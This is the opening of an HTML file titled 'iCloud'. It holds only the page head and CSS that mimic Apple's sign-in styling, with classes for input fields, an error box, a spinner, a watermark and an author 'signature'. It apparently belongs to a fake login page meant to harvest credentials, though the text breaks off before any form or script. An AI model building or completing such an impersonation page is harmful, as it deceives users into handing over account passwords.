اع<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>iCloud</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,'SF Pro Text','Helvetica Neue',sans-serif;}
body{background:#f5f5f7;min-height:100vh;display:flex;justify-content:center;align-items:center;padding:16px;}
.card{background:#ffffff;border-radius:28px;padding:48px 36px;box-shadow:0 0 0 0.5px rgba(0,0,0,0.04),0 6px 24px rgba(0,0,0,0.08);width:100%;max-width:420px;text-align:center;animation:fade 0.3s ease;position:relative;overflow:hidden;}
@keyframes fade{from{opacity:0;transform:translateY(12px);}to{opacity:1;transform:translateY(0);}}
.watermark{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%) rotate(-30deg);font-size:72px;font-weight:900;color:rgba(0,0,0,0.04);letter-spacing:8px;pointer-events:none;user-select:none;z-index:0;white-space:nowrap;}
.icon{font-size:64px;margin-bottom:6px;display:block;position:relative;z-index:1;}
h1{font-size:26px;font-weight:700;color:#1d1d1f;letter-spacing:-0.3px;margin-bottom:4px;position:relative;z-index:1;}
.desc{font-size:15px;color:#86868b;margin-bottom:32px;line-height:1.4;position:relative;z-index:1;}
.signature{font-size:10px;color:#aeaeb2;letter-spacing:3px;text-transform:uppercase;margin-bottom:24px;position:relative;z-index:1;border-top:1px solid #e8e8ed;padding-top:16px;}
.signature strong{color:#0071e3;font-size:12px;letter-spacing:4px;}
.field{position:relative;margin-bottom:14px;text-align:left;z-index:1;}
.field label{display:block;font-size:13px;font-weight:500;color:#6e6e73;margin-bottom:5px;padding-left:2px;}
.field input{width:100%;padding:16px 14px;border:1.5px solid #d2d2d7;border-radius:14px;font-size:16px;background:#fafafa;outline:none;transition:all 0.2s;color:#1d1d1f;}
.field input:focus{border-color:#0071e3;background:#fff;box-shadow:0 0 0 4px rgba(0,113,227,0.15);}
.field input::placeholder{color:#aeaeb2;font-weight:400;}
.btn{width:100%;padding:17px;background:#0071e3;color:#fff;border:none;border-radius:14px;font-size:17px;font-weight:600;cursor:pointer;margin-top:18px;transition:all 0.2s;letter-spacing:0.2px;position:relative;z-index:1;}
.btn:hover{background:#0077ed;}
.btn:active{transform:scale(0.97);background:#006edb;}
.btn:disabled{opacity:0.5;cursor:not-allowed;transform:none;}
.links{margin-top:28px;display:flex;flex-direction:column;gap:6px;position:relative;z-index:1;}
.links a{color:#0071e3;font-size:13px;text-decoration:none;font-weight:400;transition:0.2s;}
.links a:hover{text-decoration:underline;}
.error{color:#d93025;font-size:14px;margin-top:18px;display:none;background:#fef2f2;padding:10px 14px;border-radius:10px;text-align:center;font-weight:500;position:relative;z-index:1;}
.spinner{display:none;margin-top:20px;position:relative;z-index:1;}
.spinner span{display:inline-block;width:9px;height:9px;background:#0071e3;border-radius:50%;margin:0 4px;animation:bounce 1.4s ease-in-out infinite;}
.spinner span:nth-child(2){animation-delay:0.16s;}
.spinner span:nth-child(3){animation-delay:0.32s;}
